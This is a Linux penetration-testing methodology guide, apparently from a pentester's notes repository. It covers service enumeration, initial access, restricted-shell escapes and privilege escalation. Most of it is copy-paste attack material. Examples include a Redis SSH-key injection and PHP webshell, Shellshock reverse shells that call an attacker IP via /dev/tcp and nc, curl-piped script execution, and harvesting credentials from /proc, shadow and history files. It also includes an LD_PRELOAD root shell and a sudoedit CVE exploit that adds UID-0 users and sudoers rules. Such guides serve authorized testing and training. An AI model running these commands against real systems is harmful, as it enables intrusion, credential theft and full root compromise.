# Linux Penetration Testing Methodology

A comprehensive guide for attacking standalone Linux targets. Covers reconnaissance, initial access, local enumeration, privilege escalation, and post-exploitation.

For initial service discovery and port scanning, start with [Enumeration Methodology](enumeration-methodology.md).
For web-based footholds (RCE, LFI, SQLi, command injection), see [Web Methodology](web-methodology.md).
For Windows post-exploitation techniques, see [Windows Methodology](windows-methodology.md).
For file transfer methods, see [File Transfer Techniques](file-transfers.md). For pivoting, see [Tunneling & Pivoting](tunneling-pivoting.md).
For credential cracking (hashes, Kerberoast, shadow), see [Password Cracking](password-cracking.md).

> **Automation shortcut (post-foothold):** Once you have a Linux shell, run one of:
> - `bash automation/recon.sh` — pure POSIX shell, no Python required
> - `python3 automation/recon.py --mode host` — Python equivalent, same output layout
>
> Full reference (output layout, BloodHound auto-collect, env vars, troubleshooting): [Automation README](automation/README.md).
>
> Both write to `./loot_<HOSTNAME>_<TIMESTAMP>/` with categorized files (`privesc.txt`, `creds.txt`, `services.txt`, `network.txt`, `containers.txt`, `shares.txt`, `domain.txt`) plus a top-level `summary.md` with priority findings. Read-only — no exploitation. Cross-references back to this file's phases.
>
> **Domain-joined Linux hosts:** scripts auto-detect realm/sssd/krb5 join state and run comprehensive AD enum (anon LDAP probes, kerbrute no-preauth, nxc null-session, BadSuccessor scan, timeroast, DNS SRV records) into `domain_enum.txt`. If a Kerberos ticket is cached (`klist`) or `BLOODHOUND_USER`/`BLOODHOUND_PASS` env vars are set, BloodHound CE collection runs automatically (uses `bloodhound-ce-python` if installed) and drops the ZIP into `./loot_*/bloodhound/`. Otherwise the manual command is logged to `bloodhound/run.log`.

## Table of Contents

- [Phase 1: Reconnaissance & Service Enumeration](#phase-1-reconnaissance--service-enumeration)
- [Phase 2: Initial Access & Foothold](#phase-2-initial-access--foothold)
- [Phase 3: Local Enumeration](#phase-3-local-enumeration)
- [Phase 4: Privilege Escalation](#phase-4-privilege-escalation)
  - [4.1 Sudo Abuse](#41-sudo-abuse)
  - [4.2 SUID / SGID Abuse](#42-suid--sgid-abuse)
  - [4.3 Capabilities Abuse](#43-capabilities-abuse)
  - [4.4 Cron Job Hijacking](#44-cron-job-hijacking)
  - [4.5 Writable /etc/passwd](#45-writable-etcpasswd)
  - [4.6 NFS no_root_squash](#46-nfs-no_root_squash)
  - [4.7 Kernel & System Exploits — Qualys TRU Arsenal](#47-kernel--system-exploits--qualys-tru-arsenal)
  - [4.8 MySQL/MariaDB UDF Privilege Escalation](#48-mysqlmariadb-udf-privilege-escalation)
  - [4.9 Python Library Hijacking](#49-python-library-hijacking)
  - [4.10 Systemd Timer & Service Abuse](#410-systemd-timer--service-abuse)
  - [4.11 Docker Socket / Container Breakout](#411-docker-socket--container-breakout)
  - [4.12 Path Hijacking](#412-path-hijacking)
  - [4.13 Shared Library Hijacking](#413-shared-library-hijacking)
  - [4.14 Fail2ban Privilege Escalation](#414-fail2ban-privilege-escalation)
  - [4.15 Internal Service Enumeration (Post-Foothold)](#415-internal-service-enumeration-post-foothold)
- [Phase 5: Post-Exploitation & Credential Harvesting](#phase-5-post-exploitation--credential-harvesting)
  - [5.1 Credential Locations](#51-credential-locations)
  - [5.2 Persistence](#52-persistence)
- [Quick Reference: Post-Foothold Checklist](#quick-reference-post-foothold-checklist)
- [Quick Reference: Privilege Escalation Decision Tree](#quick-reference-privilege-escalation-decision-tree)
- [Quick Reference: Reverse Shells](#quick-reference-reverse-shells)
- [Quick Reference: Shell Stabilization](#quick-reference-shell-stabilization)

> **Note on subsection numbering:** Phase 4 and Phase 5 use a `N.M[base], N.Mb, N.Mc, ...` pattern where the unlettered base section is the first entry; lettered additions (`b`, `c`, `d`, ...) are appended subsections. There is no `4.1a` — `4.1` is itself the "a" entry.

---

## Phase 1: Reconnaissance & Service Enumeration

**Goal:** Discover all exposed services, OS version, and potential attack surface.

### 1.1 Port Scanning

> Canonical port-scan reference is in [enumeration-methodology.md Phase 1 — Full Port Scanning](enumeration-methodology.md#phase-1-full-port-scanning). Quick recap:

```bash
nmap -p- --min-rate 5000 -Pn <TARGET>                           # fast full TCP
nmap -p <OPEN_PORTS> -sC -sV -Pn <TARGET>                        # version + default scripts
sudo nmap -sU --top-ports 100 --min-rate 2000 -Pn <TARGET>       # UDP top-100 (slow)
```

### 1.2 SSH (TCP 22)
```bash
# Banner grab
nc -nv <IP> 22

# Check auth methods
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 <USER>@<IP>

# Check for weak ciphers / old versions
nmap -p 22 --script ssh2-enum-algos,ssh-auth-methods -Pn <IP>
```

### 1.3 FTP (TCP 21)
```bash
# Anonymous login
ftp <IP>
# Login: anonymous / anonymous@

# Nmap scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -Pn <IP>

# Download everything recursively
wget -r --no-passive ftp://anonymous:anonymous@<IP>/
```

### 1.4 HTTP/HTTPS (TCP 80/443/8080/8443)
```bash
# Technology fingerprinting
whatweb http://<IP>
curl -I http://<IP>

# Directory brute-force
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,sh,bak -t 50

# Virtual host discovery
ffuf -u http://<IP> -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <BASELINE_SIZE>
```
> For detailed web testing, see [Web Methodology](web-methodology.md).

### 1.5 SMTP (TCP 25/465/587)
```bash
# User enumeration via VRFY/EXPN
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>

# Nmap scripts
nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-open-relay -Pn <IP>
```

### 1.6 DNS (TCP/UDP 53)
```bash
# Zone transfer
dig axfr @<IP> <DOMAIN>

# Reverse lookup
dig -x <IP> @<IP>

# Brute-force subdomains
dnsrecon -d <DOMAIN> -n <IP> -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### 1.7 NFS (TCP/UDP 2049)
```bash
# Show exported shares
showmount -e <IP>

# Mount a share
mkdir /tmp/nfs
sudo mount -t nfs <IP>:/<SHARE> /tmp/nfs -o nolock

# Check for no_root_squash (privesc vector)
# If root-squash is off, files created as root on client retain root ownership
```

### 1.8 SMB (TCP 139/445)
```bash
# Enum shares
smbclient -L //<IP>/ -N
smbmap -H <IP>

# Connect to share
smbclient //<IP>/<SHARE> -N
```

### 1.9 SNMP (UDP 161)
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <IP>
snmpwalk -v2c -c public <IP>
```

### 1.10 MySQL/MariaDB (TCP 3306)
```bash
# Remote login
mysql -h <IP> -u root -p
mysql -h <IP> -u root --password=''

# Nmap scripts
nmap -p 3306 --script mysql-enum,mysql-info,mysql-empty-password -Pn <IP>
```

### 1.11 Redis (TCP 6379)
```bash
# Connect (unauthenticated)
redis-cli -h <IP>
# INFO
# KEYS *
# CONFIG GET dir
# CONFIG GET dbfilename

# SSH key injection via Redis
# Applicable when: Redis is unauthenticated AND the service user has a writable home dir

# Probe for .ssh directory
redis-cli -h <IP> CONFIG SET dir /var/lib/redis/.ssh   # OK = exists; ERR = doesn't
# Also try: /root/.ssh, /home/<USER>/.ssh

# Generate keypair, pad with newlines (Redis adds junk bytes around stored values)
ssh-keygen -t rsa -f ./redis_key -N ""
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# Import key and write to authorized_keys
cat key.txt | redis-cli -h <IP> -x SET ssh_key
redis-cli -h <IP> <<EOF
CONFIG SET dir /var/lib/redis/.ssh
CONFIG SET dbfilename "authorized_keys"
SAVE
EOF

chmod 600 redis_key
ssh -i redis_key redis@<IP>

# Alternative write targets for CONFIG SET dir:
#   /root/.ssh            — if Redis runs as root
#   /home/<USER>/.ssh     — if you know a valid user from /etc/passwd
#   /var/spool/cron/      — cron-based RCE (set dbfilename to "root")
#   /var/www/html/        — webshell (set dbfilename to "shell.php")

# Webshell via Redis (when SSH is not viable)
redis-cli -h <IP> <<EOF
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename "shell.php"
SET webshell "<?php system(\$_GET['cmd']); ?>"
SAVE
EOF
# curl http://<IP>/shell.php?cmd=id
```


### 1.12 rsync (TCP 873)
```bash
# List modules
rsync --list-only rsync://<IP>/

# Download files
rsync -av rsync://<IP>/<MODULE>/ /tmp/rsync_loot/
```

### 1.13 Other Services
```bash
# Finger (TCP 79)
finger @<IP>
finger <USER>@<IP>

# RPC (TCP 111)
rpcinfo -p <IP>

# VNC (TCP 5900-5910)
nmap -p 5900 --script vnc-info,vnc-brute -Pn <IP>
```

[Back to top](#table-of-contents)

---

## Phase 2: Initial Access & Foothold

**Goal:** Obtain first shell or credentials on the target.

### 2.1 Credential Brute-Force
```bash
# SSH
hydra -L users.txt -P passwords.txt ssh://<IP> -t 4
netexec ssh <IP> -u users.txt -p passwords.txt

# FTP
hydra -L users.txt -P passwords.txt ftp://<IP>

# HTTP POST form
hydra -l admin -P passwords.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt <IP> http-get /admin/
```

### 2.2 Service Exploitation
```bash
# vsftpd 2.3.4 backdoor
nmap -p 21 --script ftp-vsftpd-backdoor -Pn <IP>

# ProFTPd mod_copy (1.3.5)
# SITE CPFR /etc/passwd → SITE CPTO /var/www/html/passwd.txt

# Shellshock (CGI)
curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" http://<IP>/cgi-bin/<SCRIPT>

# Check for known CVEs
searchsploit <SERVICE> <VERSION>
```

### 2.2b Service Exploitation — Shellshock (CVE-2014-6271) Apache mod_cgi

> **Precondition:** vulnerable Bash (≤4.3 unpatched) reachable via Apache `mod_cgi` / `mod_cgid`. Any HTTP header reflected into a CGI environment variable becomes RCE as the web-server user.

#### Discovery — find a CGI endpoint

```bash
# Common CGI paths to probe
gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -x sh,cgi,pl -t 50

# Manual hits to check
curl -I http://<TARGET>/cgi-bin/<APP_PATH>
curl -I http://<TARGET>/cgi-bin/test.sh
curl -I http://<TARGET>/cgi-bin/status

# nmap NSE script — confirms vulnerability via reflected payload
nmap -p 80,443 --script http-shellshock --script-args "uri=/cgi-bin/<APP_PATH>,cmd=id" <TARGET>
```

#### Vulnerability check — non-destructive id probe

```bash
# Inject via User-Agent — most reliable header for CGI reflection
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://<TARGET>/cgi-bin/<APP_PATH>

# Alternate headers if UA is filtered
curl -H "Referer: () { :; }; echo; /bin/bash -c 'id'" http://<TARGET>/cgi-bin/<APP_PATH>
curl -H "Cookie: () { :; }; echo; /bin/bash -c 'id'" http://<TARGET>/cgi-bin/<APP_PATH>

# Out-of-band confirmation if no output is reflected
curl -H "User-Agent: () { :; }; /bin/bash -c 'curl http://<ATTACKER_IP>:<ATTACKER_PORT>/sshock-$(id -u)'" http://<TARGET>/cgi-bin/<APP_PATH>
```

#### Exploitation — reverse shell

```bash
# Listener
nc -lvnp <ATTACKER_PORT>

# Bash reverse shell via Shellshock
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'" http://<TARGET>/cgi-bin/<APP_PATH>

# If /bin/bash redirection is blocked, use mkfifo
curl -H "User-Agent: () { :; }; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f'" http://<TARGET>/cgi-bin/<APP_PATH>
```

#### Metasploit module

```bash
msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS <TARGET>; set TARGETURI /cgi-bin/<APP_PATH>; set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; run"
```

#### Post-exploitation — credential / key hunt as web-server user

```bash
# Inside the spawned shell
id
hostname
cat /etc/passwd | grep -v nologin

# SSH key reuse — common follow-on
find / -name "id_rsa" -o -name "id_dsa" -o -name "authorized_keys" 2>/dev/null
find /home -name ".ssh" -type d 2>/dev/null

# Read keys for users with login shells
ls -la /home/<USER>/.ssh/
cat /home/<USER>/.ssh/id_rsa
```

> **Tip:** Shellshock yields code execution as the Apache user (`apache`, `www-data`, `httpd`, or `nobody`). Pivot to interactive user via SSH key reuse or local privesc — check `sudo -l`, SUID binaries, kernel version. See Phase 3.

### 2.3 Web-Based Access
- Upload web shell via file upload vulnerability
- Exploit SQLi for file read/write or command execution
- LFI → log poisoning → RCE
- Exploit CMS vulnerabilities (WordPress, Joomla, Drupal)

> See [Web Methodology](web-methodology.md) for detailed web attack methodology.

### 2.4 SSH Key Reuse
```bash
# Check if SSH private keys are found in:
# - Web directories, FTP shares, SMB shares, NFS exports, backups
# - Database dumps, config files

# Connect with found key
chmod 600 id_rsa
ssh -i id_rsa <USER>@<IP>

# If key is passphrase-protected
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# For more cracking options, see password-cracking.md Phase 4.2 (x2john)
```

[Back to top](#table-of-contents)

---

## Phase 3: Local Enumeration

**Goal:** Map the system to identify privilege escalation vectors.

### 3.1 Quick Manual Checks
```bash
# Identity  🟢 baseline — every shell does this, no signature
id
whoami
groups

# OS / kernel
uname -a
cat /etc/os-release
cat /proc/version

# Sudo permissions (critical!)  🟢 sudo -l logs to auth.log/secure but is universal — not signatured
sudo -l

# SUID binaries  🟢 volumetric but not signatured — every privesc enum runs this
find / -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Capabilities  🟡 getcap walks the full FS — auditd execve(getcap) + heavy syscall volume; less common than `find`, more fingerprintable
getcap -r / 2>/dev/null

# Cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
systemctl list-timers

# Running processes — ENUMERATE THOROUGHLY for privesc vectors
ps auxf
ps auxf | grep root    # What's running as root?

# HIGH-VALUE flags to grep for in process list:
ps auxf | grep -iE '\-\-inspect|\-\-debug|\-\-remote-debugging|debugger'
# --inspect / --inspect-brk (Node.js debugger on port 9229) → connect → RCE as process owner
# --debug / --debug-port (legacy Node.js debugger)
# --remote-debugging-port (Chrome/Chromium headless)

# Passwords/secrets leaked in command line args
ps auxf | grep -iE 'pass|secret|token|key|mysql.*-p|postgres.*-U'
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -iE 'pass|secret|token|key' | head -20

# Race-loop /proc/cmdline harvest — catches sshpass/mysql -p BEFORE argv scrubbing
# Some processes overwrite argv immediately; tight loop catches the window
while true; do
  grep -ra "pass\|secret\|token" /proc/*/cmdline 2>/dev/null | tr '\0' ' '
done > /tmp/cmdline_harvest.txt &
# Let it run 60-120s during expected task execution, then kill and grep results
sleep 120 && kill %1 2>/dev/null
sort -u /tmp/cmdline_harvest.txt | grep -viE 'grep|cmdline_harvest'

# Services running as root that may be exploitable
ps auxf | grep -E '^root' | grep -ivE 'kernel|kthread|init|systemd' | head -30

# Installed packages
dpkg -l    # Debian/Ubuntu
rpm -qa    # RHEL/CentOS

# Network
ip a
ss -tulnp
netstat -tulnp
cat /etc/hosts
route -n
arp -a

# Users and groups
cat /etc/passwd
cat /etc/group
ls -la /home/
lastlog

# Sensitive files
ls -la /etc/shadow 2>/dev/null
ls -la /root/ 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" 2>/dev/null
```

### 3.2 Automated Enumeration
```bash
# LinPEAS (comprehensive)
# 🟡 volumetric — auditd captures thousands of execve calls in seconds; curl|sh from github = network-IOC + script-from-pipe pattern; YARA rules exist for "linpeas" string. Stage on disk and rename for engagement use.
# Source: https://github.com/peass-ng/PEASS-ng (releases → linpeas.sh)
# Attacker (Kali): obtain linpeas.sh locally, then: python3 -m http.server 80
curl http://<ATTACKER_IP>/linpeas.sh | sh
# Or transfer and run from disk:
./linpeas.sh | tee linpeas_output.txt

# pspy — monitor processes without root (catches cron jobs, scripts run by other users)
# https://github.com/DominicBreuker/pspy/releases
./pspy64
# Watch for recurring commands run by root — common privesc vector

# LinEnum
# https://github.com/rebootuser/LinEnum
./LinEnum.sh -t

# linux-exploit-suggester
# https://github.com/The-Z-Labs/linux-exploit-suggester
./linux-exploit-suggester.sh
```

### 3.3 Living-off-the-Land Enumeration (No Tools Required)

When linpeas/LinEnum cannot be transferred (restricted shell, no curl/wget, air-gapped), use pure builtins. Every command below ships with any standard Linux install.

> **LOTL note:** All commands use only POSIX-standard utilities or bash builtins. No external downloads, no Python, no Go binaries. This is your fallback when file transfer is blocked.

#### System & Kernel
```bash
# Kernel version + architecture (exploit research target)
uname -a
cat /proc/version
cat /etc/os-release 2>/dev/null || cat /etc/*release 2>/dev/null

# Loaded kernel modules (exploitable drivers)
lsmod
cat /proc/modules

# Uptime (recently rebooted = fresh config; long uptime = stale patches)
uptime
```

#### Users & Access
```bash
# All users with shell access (non-nologin/false)
grep -v -E '(nologin|false)$' /etc/passwd

# Users with UID 0 (root equivalents)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Current user's groups + sudoers
id
sudo -l 2>/dev/null

# Who else is logged in / recent logins
w
who
last -n 20 2>/dev/null

# Home directories — readable?
ls -la /home/
for d in /home/*/; do echo "=== $d ===" && ls -la "$d" 2>/dev/null; done

# Password aging (lockout/expiry)
for u in $(cut -d: -f1 /etc/passwd); do chage -l "$u" 2>/dev/null; done
```

#### Credential Hunting (Pure Bash)
```bash
# SSH keys (reuse across hosts)
find / -name "authorized_keys" -o -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
ls -laR /home/*/.ssh/ /root/.ssh/ 2>/dev/null

# Backup SSH keys (commonly found in /opt, /tmp, /var/backups)
find / \( -name "id_rsa*" -o -name "*.pem" -o -name "*.key" \) -type f 2>/dev/null
# Look for: id_rsa.bak, id_rsa.old, id_rsa.backup, *.key.bak
# If encrypted: ssh2john id_rsa.bak > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Password/secret strings in common locations
grep -rli 'password\|passwd\|pass\s*=\|secret\|token\|api.key\|connectionstring' \
  /etc/ /opt/ /var/www/ /home/ /root/ /srv/ 2>/dev/null | head -30

# History files (passwords typed on CLI)
cat /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -i 'pass\|secret\|token\|mysql\|ssh\|su '

# Environment variables (may contain secrets)
env
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i 'pass\|key\|token\|secret'

# Shadow readable? (instant win)
cat /etc/shadow 2>/dev/null && echo "[!] SHADOW READABLE"

# Mail
ls -la /var/mail/ /var/spool/mail/ 2>/dev/null
cat /var/mail/* 2>/dev/null | head -100

# Database config files (common locations)
for f in /var/www/*/wp-config.php /var/www/*/.env /var/www/*/config.php \
         /opt/*/config.yml /opt/*/.env /etc/mysql/my.cnf \
         /etc/postgresql/*/main/pg_hba.conf; do
  [ -r "$f" ] && echo "[+] READABLE: $f" && head -30 "$f"
done
```

#### Network & Pivoting
```bash
# All interfaces (dual-homed = pivot opportunity)
ip a 2>/dev/null || ifconfig

# Routing table (other subnets reachable?)
ip route 2>/dev/null || route -n

# ARP table (who's on the LAN?)
ip neigh 2>/dev/null || arp -a

# Listening services (internal services on 127.0.0.1?)
ss -tulnp 2>/dev/null || netstat -tulnp

# /etc/hosts (hostname → IP mappings, sometimes reveals internal hosts)
cat /etc/hosts

# DNS config
cat /etc/resolv.conf

# Established connections (who is this host talking to?)
ss -tp 2>/dev/null || netstat -tp

# Firewall rules (iptables)
iptables -L -n 2>/dev/null
cat /etc/iptables/rules.v4 2>/dev/null
```

#### Privilege Escalation Reconnaissance
```bash
# === SUID/SGID/Capabilities — the trinity of quick wins ===
echo "=== SUID ===" && find / -perm -4000 -type f 2>/dev/null
echo "=== SGID ===" && find / -perm -2000 -type f 2>/dev/null
echo "=== Capabilities ===" && getcap -r / 2>/dev/null

# Writable files owned by root (cron scripts, service configs)
find / -writable -user root -type f 2>/dev/null | grep -v '/proc\|/sys'

# Cron jobs (writable scripts? wildcard injection?)
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null
for f in /etc/cron.d/*; do echo "=== $f ===" && cat "$f" 2>/dev/null; done

# Systemd timers (alternative to cron)
systemctl list-timers --all 2>/dev/null

# Writable service files
find /etc/systemd/ /lib/systemd/ -writable -name "*.service" 2>/dev/null

# NFS exports with no_root_squash
cat /etc/exports 2>/dev/null | grep no_root_squash

# PATH hijacking check
echo $PATH
# Look for writable directories early in PATH
for p in $(echo $PATH | tr ':' '\n'); do
  [ -w "$p" ] && echo "[!] WRITABLE PATH: $p"
done

# doas config (alternative to sudo on BSD/some distros)
cat /etc/doas.conf 2>/dev/null
```

#### Container & Virtualization Awareness
```bash
# Am I in a container?
cat /proc/1/cgroup 2>/dev/null | grep -qi 'docker\|lxc\|containerd' && echo "[!] Inside container"
ls -la /.dockerenv 2>/dev/null && echo "[!] Docker container"
cat /proc/self/status | grep -i 'NSpid\|NStgid' 2>/dev/null

# Docker socket accessible? (container breakout)
ls -la /var/run/docker.sock 2>/dev/null && echo "[!] Docker socket accessible — breakout possible"

# Am I in a VM?
cat /sys/class/dmi/id/sys_vendor 2>/dev/null
dmesg 2>/dev/null | grep -i 'hypervisor\|vmware\|virtualbox\|kvm\|xen' | head -3
```

#### One-Liner Full Enum (Copy-Paste Ready)
```bash
# Paste this single block for instant situational awareness
echo "=== ID ===" && id && echo "=== KERNEL ===" && uname -a && echo "=== SUDO ===" && sudo -l 2>/dev/null && echo "=== SUID ===" && find / -perm -4000 -type f 2>/dev/null && echo "=== CAPS ===" && getcap -r / 2>/dev/null && echo "=== CRON ===" && cat /etc/crontab && echo "=== NETWORK ===" && ip a && ss -tulnp && echo "=== SHADOW ===" && cat /etc/shadow 2>/dev/null && echo "=== HISTORY ===" && cat ~/.bash_history 2>/dev/null | tail -20
```

### 3.4 Restricted Shell Breakouts

If you land in `rbash`, `rksh`, `rzsh`, or a custom restricted menu, escape it before doing anything else — most enumeration commands will be blocked. Cross-reference [GTFOBins](https://gtfobins.github.io/) (filter "Shell") for any binary that's allowed.

```bash
# === DETECTION — confirm restricted shell ===
echo $SHELL                       # /bin/rbash, /usr/bin/rksh, etc.
echo $0                           # current shell name
shopt restricted_shell 2>/dev/null  # bash: returns "on" if restricted
compgen -c | head -50             # list available builtins/commands

# Typical rbash restrictions: no cd, no /, no PATH change, no redirection (> >>), no exec
cd /                              # rbash: -rbash: cd: restricted
ls /tmp/foo > /tmp/out            # rbash: -rbash: /tmp/out: restricted: cannot redirect output
```

```bash
# === BREAKOUTS via allowed editors/pagers/text tools ===

# vi / vim → drop to shell
vi
# inside vi: :set shell=/bin/bash
#            :shell           (or :sh)
# alternative: :!/bin/bash

# less / more / man → shell escape
less /etc/hosts
# inside less: !bash           (! drops to shell)
# alternative: v (opens $EDITOR — if vi, escape from there)

# nano (limited but works if -R/--restricted not set)
nano
# Ctrl+R then Ctrl+X → "Command to execute: " → reset; bash

# ed → !cmd
ed
# !/bin/bash

# === BREAKOUTS via interpreters/utils ===

# awk
awk 'BEGIN{system("/bin/bash")}'

# find -exec
find . -exec /bin/bash \;
find / -name nonexistent -exec /bin/bash \; -quit

# python / perl / ruby / lua / php / node — any scripting interp
python3 -c 'import os; os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
lua -e 'os.execute("/bin/bash")'
php -r 'system("/bin/bash");'
node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'

# expect
expect -c 'spawn /bin/bash; interact'

# git (often present, often allowed)
git help status                   # opens in less → !bash
git -p config -l                  # pager → !bash
GIT_PAGER='/bin/bash' git -p log

# busybox
busybox sh

# scp / ssh ProxyCommand abuse (when ssh client is allowed)
ssh user@localhost -t '/bin/bash --noprofile --norc'
ssh user@host -o ProxyCommand='/bin/bash 0<&2 1>&2' x

# === BREAKOUTS via PATH/env reset ===

# rbash often locks PATH but doesn't unset it — reset to standard
export PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin
# If export is blocked: PATH=/bin:/usr/bin /bin/bash --noprofile --norc

# env -i wipes the environment, spawns clean shell
env -i bash --noprofile --norc
/usr/bin/env -i /bin/bash -p

# Spawn unrestricted bash directly (rbash is just bash with -r flag)
/bin/bash --noprofile --norc
/bin/bash +r                      # explicitly disable restricted mode

# Force bash to ignore profile/rc that set restricted mode
bash --noprofile --norc -i

# === BREAKOUTS via command substitution (when only builtins allowed) ===

# If $() / backticks work but external commands are blocked by name
$(echo /bin/bash)                 # expands then executes
`echo /bin/bash`
${PATH##*:}/bash                  # parameter expansion to build path

# Read file via builtin redirection (when cat/less blocked)
while read l; do echo "$l"; done < /etc/passwd
mapfile -t lines < /etc/passwd; printf '%s\n' "${lines[@]}"

# === SSH-LEVEL BYPASSES (before the restricted shell starts) ===

# Force a non-login, non-rc shell at SSH connect time
ssh user@host -t 'bash --noprofile --norc'
ssh user@host -t '/bin/sh -i'

# Run a single command instead of dropping into the shell
ssh user@host '/bin/bash -i'
ssh user@host 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"'

# SCP/SFTP subsystem may be enabled even when shell is restricted —
# upload your own static binary then exec it via the breakouts above
scp /static/busybox user@host:/tmp/bb
ssh user@host -t '/tmp/bb sh'
```

> Cross-reference: every binary listed in `compgen -c` (or visible in `/usr/lib/<rbash-shellname>/`) → check [GTFOBins → Shell](https://gtfobins.github.io/#+shell) for a known escape.

[Back to top](#table-of-contents)

---

## Phase 4: Privilege Escalation

**Goal:** Elevate from standard user to root.

### 4.1 Sudo Abuse

```bash
sudo -l

# Also check for doas (sudo alternative, common on BSD and some Linux)
cat /etc/doas.conf 2>/dev/null
```
Cross-reference every allowed binary with [GTFOBins](https://gtfobins.github.io/).

```bash
# Common GTFOBins examples
sudo vim -c '!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \;
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo env /bin/sh
sudo nmap --interactive   # old nmap
sudo less /etc/shadow     # then !sh

# LD_PRELOAD (if env_keep+=LD_PRELOAD in sudo -l)
# 1. Create malicious shared object:
cat <<'EOF' > /tmp/shell.c
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/shell.so /tmp/shell.c
# 2. Run allowed sudo command with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so <ALLOWED_BINARY>

# LD_LIBRARY_PATH (if env_keep+=LD_LIBRARY_PATH in sudo -l)
# Similar approach — compile fake shared library and hijack
```

### 4.1b Sudoedit CVE-2023-22809 — Arbitrary File Edit as Root

`sudoedit` (a.k.a. `sudo -e`) honors the user-controlled `EDITOR` / `VISUAL` / `SUDO_EDITOR` environment variables. By appending `--` followed by another file path, the attacker tricks sudoedit into editing a second, attacker-chosen file with elevated privileges. Affects **sudo 1.8.0 → 1.9.12p1** (fixed in 1.9.12p2).

```bash
# === STEP 1: VERSION + APPLICABILITY CHECK ===
sudo --version | head -1
# Vulnerable: Sudo version 1.8.0 ... 1.9.12p1
# Patched:    Sudo version 1.9.12p2 or later

# Confirm sudoedit is allowed (any sudoedit entry — even for a single, unrelated file — is exploitable)
sudo -l
# Look for lines like:
#   (root) NOPASSWD: sudoedit /etc/app/config.yml
#   (root) sudoedit /var/log/app/*.log
# The ALLOWED file path is irrelevant — any sudoedit privilege = full file read/write as root.
```

```bash
# === STEP 2: EXPLOIT — read/write any file as root ===

# Payload trick: EDITOR variable accepts a "--" separator. Anything after -- is
# a NEW file argument that sudoedit happily opens AFTER the legitimate target.
# The legitimate file path is appended by sudo but the second file is opened
# first as a positional argument by the editor.

# Read /etc/shadow as root (using vim)
EDITOR='vim -- /etc/shadow' sudoedit /etc/app/config.yml
# vim opens /etc/shadow as root; you can read it, then :q without saving

# Write a new sudoers rule (persistent NOPASSWD for your user)
EDITOR='vim -- /etc/sudoers.d/pwn' sudoedit /etc/app/config.yml
# In vim:  i  →  pwn ALL=(ALL) NOPASSWD: ALL  →  ESC :wq
# Then:    sudo -u root /bin/bash

# Add a UID-0 user to /etc/passwd
EDITOR='vim -- /etc/passwd' sudoedit /etc/app/config.yml
# Append: pwn::0:0::/root:/bin/bash
# Then:   su pwn   (no password)

# Append your SSH key to root's authorized_keys
EDITOR='vim -- /root/.ssh/authorized_keys' sudoedit /etc/app/config.yml
# Insert your pub key, save, then: ssh root@<TARGET>

# Alternative editors — the same trick works with any editor that accepts file args
SUDO_EDITOR='nano -- /etc/shadow' sudoedit /etc/app/config.yml
VISUAL='ed -- /etc/sudoers' sudoedit /etc/app/config.yml

# Single-shot read (when interactive editor isn't viable — e.g. limited TTY)
# vim's -c flag executes commands, %p prints the buffer, q! quits without saving
EDITOR='vim -- /etc/shadow -c ":%p" -c ":q!"' sudoedit /etc/app/config.yml 2>&1
```

```bash
# === STEP 3: CLEANUP (remove evidence after engagement) ===

# If you wrote /etc/sudoers.d/pwn — remove it as root
sudo rm /etc/sudoers.d/pwn

# If you appended to /etc/passwd / /root/.ssh/authorized_keys — revert via the same trick
EDITOR='vim -- /etc/passwd' sudoedit /etc/app/config.yml
# Delete the inserted line and :wq

# Per Purple Team rules: leave a marker file documenting the action for engagement report
